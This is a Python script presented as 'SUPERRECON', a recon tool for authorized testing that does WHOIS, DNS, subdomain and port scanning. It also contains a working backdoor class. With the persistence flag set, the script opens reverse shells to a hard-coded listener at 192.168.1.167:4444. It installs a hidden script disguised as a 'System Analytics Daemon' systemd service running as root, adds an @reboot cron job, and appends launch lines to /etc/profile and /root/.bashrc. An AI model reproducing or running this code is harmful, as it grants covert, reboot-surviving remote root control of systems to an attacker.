#!/usr/bin/env python3
"""
🔥 SUPERRECON - PERSISTENT RECON TOOL v3.0
Advanced Reconnaissance with Reboot-Survival Persistence
For Authorized Security Testing Only
"""

import socket
import requests
import whois
import dns.resolver
import json
import threading
import concurrent.futures
import argparse
import sys
import ssl
import time
import urllib3
import subprocess
import os
import base64
import hashlib
from datetime import datetime
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PersistentBackdoor:
    def __init__(self):
        self.LHOST = "192.168.1.167"
        self.LPORT = 4444
        self.stealth_dir = "/tmp/.systemd-cache"
        self.current_dir = os.getcwd()
        
    def wait_for_network_after_reboot(self):
        """Wait for network connectivity after system reboot"""
        print("[+] Waiting for network after reboot...")
        for i in range(60):
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=10)
                print("[✅] Network is ready after reboot")
                return True
            except:
                if i % 10 == 0:
                    print(f"[⏳] Waiting for network... {i}/60 seconds")
                time.sleep(1)
        print("[⚠️] Network timeout, continuing anyway...")
        return True
    
    def become_daemon(self):
        """Run as background daemon"""
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        
        os.chdir("/")
        os.setsid()
        os.umask(0)
        
    def establish_reverse_shell(self):
        """Establish reverse shell connection"""
        while True:
            try:
                print(f"[🔄] Attempting connection to {self.LHOST}:{self.LPORT}")
                
                s = socket.socket()
                s.settimeout(30)
                s.connect((self.LHOST, self.LPORT))
                
                print("[✅] SUCCESS: Reverse shell connected!")
                s.send(b"SUPERRECON_PERSISTENT: Shell active!\n")
                
                # Main command loop
                while True:
                    data = s.recv(1024).decode().strip()
                    if not data:
                        continue
                        
                    if data.lower() == 'exit':
                        break
                    
                    # Execute command
                    try:
                        result = subprocess.run(data, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                    except Exception as e:
                        output = f"Error: {str(e)}"
                    
                    s.send(output.encode())
                    
            except ConnectionRefusedError:
                print("[❌] Listener offline, retrying in 30s...")
            except Exception as e:
                print(f"[❌] Connection error: {e}")
            
            time.sleep(30)

    def deploy_systemd_persistence(self):
        """Deploy systemd service for reboot survival"""
        try:
            # Create stealth directory
            os.makedirs(self.stealth_dir, exist_ok=True)
            
            # Create persistent backdoor script
            backdoor_script = f'''#!/usr/bin/env python3
import socket, subprocess, os, time, sys

LHOST = "{self.LHOST}"
LPORT = {self.LPORT}

def wait_network():
    for i in range(60):
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=10)
            return True
        except: time.sleep(1)
    return True

def reverse_shell():
    while True:
        try:
            s = socket.socket()
            s.settimeout(30)
            s.connect((LHOST, LPORT))
            s.send(b"REBOOT_SURVIVED: System back online!\\\\n")
            
            while True:
                data = s.recv(1024).decode().strip()
                if not data: continue
                if data == 'exit': break
                try:
                    result = subprocess.run(data, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    s.send(output.encode())
                except: pass
        except: time.sleep(30)

if __name__ == "__main__":
    wait_network()
    reverse_shell()
'''
            
            # Save backdoor script
            backdoor_path = f"{self.stealth_dir}/.system_analytics.py"
            with open(backdoor_path, 'w') as f:
                f.write(backdoor_script)
            os.chmod(backdoor_path, 0o755)
            
            # Create systemd service
            service_content = f'''[Unit]
Description=System Analytics Daemon
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=10
User=root
ExecStart=/usr/bin/python3 {backdoor_path}
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
'''
            
            service_path = "/etc/systemd/system/system-analytics.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", "system-analytics.service"], capture_output=True)
            subprocess.run(["systemctl", "start", "system-analytics.service"], capture_output=True)
            
            print("[✅] Systemd persistence deployed")
            return True
            
        except Exception as e:
            print(f"[-] Systemd persistence failed: {e}")
            return False

    def deploy_cron_persistence(self):
        """Deploy cron job for redundancy"""
        try:
            cron_command = f"@reboot /usr/bin/python3 {self.stealth_dir}/.system_analytics.py > /dev/null 2>&1"
            
            # Get current crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add if not present
            if "system_analytics.py" not in current_cron:
                new_cron = current_cron + cron_command + "\n"
                subprocess.run(["crontab", "-"], input=new_cron, text=True)
                print("[✅] Cron persistence deployed")
            return True
        except Exception as e:
            print(f"[-] Cron persistence failed: {e}")
            return False

    def deploy_profile_persistence(self):
        """Deploy shell profile persistence"""
        try:
            profile_command = f'nohup python3 {self.stealth_dir}/.system_analytics.py &'
            profile_files = ["/etc/profile", "/root/.bashrc"]
            
            for profile in profile_files:
                if os.path.exists(profile):
                    with open(profile, 'a') as f:
                        f.write(f"\n{profile_command}\n")
            print("[✅] Profile persistence deployed")
            return True
        except Exception as e:
            print(f"[-] Profile persistence failed: {e}")
            return False

    def start_immediate_shell(self):
        """Start immediate reverse shell in background"""
        try:
            # Start in background
            subprocess.Popen([
                '/usr/bin/python3', '-c', 
                f'import socket,subprocess,os,time;'
                f's=socket.socket();s.settimeout(30);'
                f's.connect(("{self.LHOST}",{self.LPORT}));'
                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
                f'subprocess.call(["/bin/bash","-i"])'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[✅] Immediate reverse shell started")
            return True
        except Exception as e:
            print(f"[-] Immediate shell failed: {e}")
            return False

    def deploy_all_persistence(self):
        """Deploy all persistence mechanisms"""
        print(f"\n[🔧] DEPLOYING PERSISTENCE TO {self.LHOST}:{self.LPORT}")
        
        # Start immediate connection
        self.start_immediate_shell()
        
        # Deploy persistence mechanisms
        methods = [
            self.deploy_systemd_persistence,
            self.deploy_cron_persistence, 
            self.deploy_profile_persistence
        ]
        
        success_count = 0
        for method in methods:
            if method():
                success_count += 1
                time.sleep(1)
        
        print(f"[✅] Deployed {success_count}/{len(methods)} persistence methods")
        return success_count > 0

class UltimateReconTool:
    def __init__(self, target, threads=50, timeout=10, enable_persistence=False):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.enable_persistence = enable_persistence
        self.persistence = PersistentBackdoor()
        self.results = {}
        self.initialize_results()
        
    def initialize_results(self):
        """Initialize results structure"""
        self.results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'ip_address': None,
            'whois': {},
            'dns_records': {},
            'subdomains': [],
            'open_ports': [],
            'services': {},
            'web_technologies': {},
            'vulnerabilities': [],
            'ssl_info': {},
            'directory_enum': [],
            'osint_data': {},
            'persistence_deployed': False
        }

    def banner(self):
        """Display the tool banner"""
        print("""
╔════════════════════════════════════════════════════════════════╗
║              🔥 SUPERRECON - PERSISTENT RECON v3.0            ║  
║               Advanced Reconnaissance + Persistence           ║
╚════════════════════════════════════════════════════════════════╝
        """)
        print(f"[*] Target: {self.target}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Persistence: {'ENABLED' if self.enable_persistence else 'DISABLED'}")
        if self.enable_persistence:
            print(f"[*] Listener: {self.persistence.LHOST}:{self.persistence.LPORT}")
        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)

    def get_ip(self):
        """Get IP address of target"""
        try:
            ip = socket.gethostbyname(self.target)
            print(f"[+] IP Address: {ip}")
            self.results['ip_address'] = ip
            return ip
        except Exception as e:
            print(f"[-] Error resolving IP: {e}")
            return None

    def whois_lookup(self):
        """Perform WHOIS lookup"""
        try:
            print(f"\n[+] Performing WHOIS lookup...")
            w = whois.whois(self.target)
            self.results['whois'] = {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
            }
            print(f"    Registrar: {w.registrar}")
            print(f"    Creation Date: {w.creation_date}")
        except Exception as e:
            print(f"[-] WHOIS lookup failed: {e}")

    def dns_enumeration(self):
        """Enumerate DNS records"""
        try:
            print(f"\n[+] Enumerating DNS records...")
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT']
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(self.target, record_type, raise_on_no_answer=False)
                    if answers.rrset:
                        records = [str(rdata) for rdata in answers]
                        self.results['dns_records'][record_type] = records
                        print(f"    {record_type}: {', '.join(records[:2])}")
                except:
                    continue
                    
        except Exception as e:
            print(f"[-] DNS enumeration failed: {e}")

    def subdomain_enumeration(self):
        """Enumerate subdomains"""
        subdomain_wordlist = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
            'ns2', 'cpanel', 'whm', 'autodiscover', 'admin', 'forum', 'vpn', 
            'dev', 'test', 'api', 'blog', 'shop', 'secure'
        ]
        
        print(f"\n[+] Starting subdomain enumeration...")
        found_subdomains = set()
        
        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{self.target}"
            try:
                socket.gethostbyname(full_domain)
                found_subdomains.add(full_domain)
                print(f"      Found: {full_domain}")
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_subdomain, subdomain_wordlist[:15])
            
        self.results['subdomains'] = list(found_subdomains)
        print(f"[+] Found {len(found_subdomains)} subdomains")

    def port_scanning(self, ip=None):
        """Scan common ports"""
        if not ip:
            ip = self.results['ip_address']
        if not ip:
            return
            
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080]
        
        print(f"\n[+] Scanning common ports on {ip}...")
        
        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        service_name = self.get_service_name(port)
                        self.results['open_ports'].append({
                            'port': port,
                            'service': service_name
                        })
                        print(f"    Port {port}/tcp open - {service_name}")
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(scan_port, common_ports)

    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 443: 'https', 993: 'imaps',
            3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 8080: 'http-proxy'
        }
        return services.get(port, 'unknown')

    def web_technology_detection(self):
        """Detect web technologies"""
        print(f"\n[+] Detecting web technologies...")
        
        for scheme in ['http', 'https']:
            try:
                url = f"{scheme}://{self.target}"
                response = requests.get(url, timeout=self.timeout, verify=False)
                
                server = response.headers.get('Server', '')
                if server:
                    print(f"    Web Server: {server}")
                    self.results['web_technologies']['server'] = server
                
                powered_by = response.headers.get('X-Powered-By', '')
                if powered_by:
                    print(f"    Powered By: {powered_by}")
                    self.results['web_technologies']['powered_by'] = powered_by
                
                if 'wp-content' in response.text:
                    print("    Framework: WordPress")
                    self.results['web_technologies']['framework'] = 'WordPress'
                    
                break
            except:
                continue

    def deploy_persistence(self):
        """Deploy persistence mechanisms"""
        if not self.enable_persistence:
            return False
            
        print(f"\n[🔧] INITIATING PERSISTENCE DEPLOYMENT...")
        
        try:
            success = self.persistence.deploy_all_persistence()
            self.results['persistence_deployed'] = success
            self.results['listener_ip'] = self.persistence.LHOST
            self.results['listener_port'] = self.persistence.LPORT
            
            if success:
                print("[✅] Persistence deployed successfully")
                print("[🔮] Backdoor will survive reboots via:")
                print("     - Systemd service (system-analytics.service)")
                print("     - Cron job (@reboot)")
                print("     - Shell profile persistence")
            return success
            
        except Exception as e:
            print(f"[-] Persistence deployment failed: {e}")
            return False

    def generate_report(self, output_file=None):
        """Generate reconnaissance report"""
        if not output_file:
            output_file = f"superrecon_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        print(f"\n[+] Generating report: {output_file}")
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        self.print_summary()
        return output_file

    def print_summary(self):
        """Print scan summary"""
        print("\n" + "="*60)
        print("📊 SUPERRECON SUMMARY")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"IP Address: {self.results['ip_address']}")
        print(f"Subdomains Found: {len(self.results['subdomains'])}")
        print(f"Open Ports: {len(self.results['open_ports'])}")
        
        if self.enable_persistence and self.results.get('persistence_deployed'):
            print(f"Persistence: ACTIVE → {self.persistence.LHOST}:{self.persistence.LPORT}")
            print("🔮 Backdoor will auto-reconnect after reboot")
        else:
            print("Persistence: DISABLED")

    def run_full_scan(self):
        """Execute full reconnaissance scan"""
        start_time = time.time()
        
        try:
            self.banner()
            
            # Execute reconnaissance
            ip = self.get_ip()
            self.whois_lookup()
            self.dns_enumeration()
            self.subdomain_enumeration()
            self.port_scanning(ip)
            self.web_technology_detection()
            
            # Deploy persistence if enabled
            if self.enable_persistence:
                self.deploy_persistence()
            
            elapsed_time = time.time() - start_time
            print(f"\n[✅] Scan completed in {elapsed_time:.2f} seconds")
            return self.results
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
            return self.results
        except Exception as e:
            print(f"\n[-] Scan failed: {e}")
            return self.results

def main():
    parser = argparse.ArgumentParser(description="🔥 SUPERRECON v3.0 - Persistent Reconnaissance")
    parser.add_argument("target", help="Target domain or IP address")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("-o", "--output", help="Output file for report")
    parser.add_argument("-p", "--persistence", action="store_true", 
                       help="Enable persistence module (requires root)")
    
    args = parser.parse_args()
    
    print("""
⚠️  AUTHORIZED USE ONLY
This tool is for authorized security testing only.
Ensure you have explicit permission before use.
    """)
    
    if args.persistence and os.geteuid() != 0:
        print("[-] Persistence requires root privileges")
        args.persistence = False
    
    # Run the tool
    tool = UltimateReconTool(args.target, threads=args.threads, enable_persistence=args.persistence)
    results = tool.run_full_scan()
    
    if results:
        report_file = tool.generate_report(args.output)
        print(f"\n🎯 Report saved to: {report_file}")

if __name__ == "__main__":
    main()
